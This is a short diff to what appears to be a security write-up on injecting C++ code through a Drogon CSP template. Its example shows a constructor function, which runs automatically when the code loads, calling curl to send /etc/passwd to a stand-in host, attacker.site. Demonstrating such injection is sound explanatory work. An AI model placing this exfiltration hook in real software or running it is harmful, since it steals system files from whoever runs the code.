@@ -456,13 +456,11 @@ We demonstrate this with the following CSP:
 ```csp {data-label=Example.csp}
 <%c++ 
 } 
-
-__attribute__((constructor)) void foo()
+__attribute__((constructor)) void injected()
 {
     system("curl http://attacker.site --data @/etc/passwd");
 }
-
-std::string bar(const DrTemplateData& Example_view_data)
+std::string dummy(const DrTemplateData&)
 {
     drogon::OStringStream Example_tmp_stream;
     std::string layoutName{""};
@@ -479,7 +477,7 @@ std::string Example::genText(const DrTemplateData& Example_view_data)
     std::string layoutName{""};
  
 } 
-__attribute__((constructor)) void injected()  // Injected function.
+__attribute__((constructor)) void injected()
 {
     system("curl http://attacker.site --data @/etc/passwd");
 }
